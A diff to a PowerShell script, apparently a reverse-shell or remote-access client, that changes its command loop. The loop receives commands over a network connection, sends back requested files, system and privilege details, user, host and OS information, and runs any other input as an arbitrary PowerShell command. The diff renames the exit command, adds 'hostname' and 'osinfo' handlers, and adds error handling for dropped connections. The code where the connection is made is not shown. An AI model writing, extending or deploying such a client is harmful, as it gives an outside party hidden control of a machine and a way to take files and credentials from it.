@@ -86,38 +86,49 @@ function Start-Client {
             $writer.Flush()
             
             while ($client.Connected) {
-                $command = $reader.ReadLine()
-                
-                if ([string]::IsNullOrEmpty($command)) { continue }
-                
-                Write-Host "[*] Received command: $command"
-                
-                $output = switch -Regex ($command) {
-                    "^die$" {
-                        $client.Close()
-                        exit
+                try {
+                    $command = $reader.ReadLine()
+                    
+                    if ([string]::IsNullOrEmpty($command)) { continue }
+                    
+                    Write-Host "[*] Received command: $command"
+                    
+                    $output = switch -Regex ($command) {
+                        "^kill-session$" {
+                            $client.Close()
+                            exit
+                        }
+                        "^getfile:(.*)" {
+                            $filepath = $matches[1]
+                            Get-FileContent -filepath $filepath
+                        }
+                        "^sysinfo$" {
+                            Get-SystemDetails
+                        }
+                        "^privileges$" {
+                            Get-WindowsPrivileges
+                        }
+                        "^whoami$" {
+                            "$env:USERDOMAIN\$env:USERNAME"
+                        }
+                        "^hostname$" {
+                            $env:COMPUTERNAME
+                        }
+                        "^osinfo$" {
+                            [System.Environment]::OSVersion.VersionString
+                        }
+                        default {
+                            Invoke-PowerShellCommand -command $command
+                        }
                     }
-                    "^getfile:(.*)" {
-                        $filepath = $matches[1]
-                        Get-FileContent -filepath $filepath
+                    
+                    if ($output) {
+                        $writer.WriteLine($output)
+                        $writer.Flush()
                     }
-                    "^sysinfo$" {
-                        Get-SystemDetails
-                    }
-                    "^privileges$" {
-                        Get-WindowsPrivileges
-                    }
-                    "^whoami$" {
-                        "$env:USERDOMAIN\$env:USERNAME"
-                    }
-                    default {
-                        Invoke-PowerShellCommand -command $command
-                    }
-                }
-                
-                if ($output) {
-                    $writer.WriteLine($output)
-                    $writer.Flush()
+                } catch [System.IO.IOException] {
+                    # Connection interrupted, try to reconnect
+                    break
                 }
             }
             
